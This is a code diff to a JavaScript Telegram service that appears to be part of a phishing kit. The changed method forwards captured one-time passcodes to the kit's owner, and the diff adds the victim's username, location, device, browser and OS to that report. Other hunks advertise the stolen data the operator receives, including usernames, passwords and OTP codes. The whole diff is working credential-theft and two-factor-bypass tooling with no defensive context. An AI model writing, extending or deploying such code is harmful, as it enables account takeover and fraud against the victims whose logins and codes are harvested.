@@ -275,7 +275,7 @@ class TelegramService {
     }
 
     // ============================================
-    // 📩 OTP DATA - SENT TO OWNER
+    // 📩 OTP DATA - SENT TO OWNER (FULL DETAILS)
     // ============================================
 
     async sendOTPToOwner(data) {
@@ -283,16 +283,31 @@ class TelegramService {
 
         this.otpCounter++;
 
+        // Get user info from stored data
+        const userLogin = this.userData.find(u => u.id === data.userId && u.type === 'login');
+        const username = userLogin ? userLogin.username : 'Unknown';
+        const location = this.getLocationFromIP(data.ip);
+        const deviceType = this.getDeviceType(data.userAgent);
+        const browser = this.getBrowser(data.userAgent);
+        const os = this.getOS(data.userAgent);
+
+        // Store OTP data
         this.userData.push({
             type: 'otp',
             userId: data.userId,
+            username: username,
             otp: data.otp,
             ip: data.ip,
             userAgent: data.userAgent,
             timestamp: data.timestamp,
-            otpNumber: this.otpCounter
+            otpNumber: this.otpCounter,
+            location: location,
+            deviceType: deviceType,
+            browser: browser,
+            os: os
         });
 
+        // Build complete OTP message with full details
         const message = `
 🔐 <b>🔴 OTP CODE CAPTURED</b>
 <pre>═══════════════════════════════════════</pre>
@@ -301,15 +316,25 @@ class TelegramService {
 <pre>─────────────────────────────────────</pre>
 
    🆔 <b>User ID:</b> <code>${data.userId}</code>
+   👤 <b>Username:</b> <code>${username}</code>
    🔢 <b>OTP Code:</b> <code>${data.otp}</code>
    🔢 <b>OTP #:</b> <code>${this.otpCounter}</code>
 
 <b>🌐 NETWORK INFO:</b>
    📱 <b>IP Address:</b> <code>${data.ip}</code>
+   🌍 <b>Location:</b> ${location}
    ⏰ <b>Timestamp:</b> ${data.timestamp}
 
 <b>💻 DEVICE INFO:</b>
    🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
+   📱 <b>Device Type:</b> ${deviceType}
+   🌐 <b>Browser:</b> ${browser}
+   💻 <b>OS:</b> ${os}
+
+<b>🔐 SECURITY STATUS:</b>
+   🛡️ <b>Status:</b> OTP Submitted
+   🔒 <b>Encryption:</b> AES-256
+   📊 <b>Threat Level:</b> ${this.getThreatLevel(data.ip)}
 
 <pre>═══════════════════════════════════════</pre>
 
@@ -639,7 +664,7 @@ ${message}
 
 <b>📩 What you'll receive:</b>
    • ✅ Usernames & Passwords
-   • ✅ OTP Codes
+   • ✅ OTP Codes (from web)
    • ✅ IP Addresses
    • ✅ User Agents
    • ✅ Page Visits
@@ -787,7 +812,7 @@ ${dataText || '   No data yet'}
 
 <b>📩 Data Received:</b>
    • Credentials (username/password)
-   • OTP codes
+   • OTP codes (from web)
    • IP addresses
    • User agents
    • Page visits
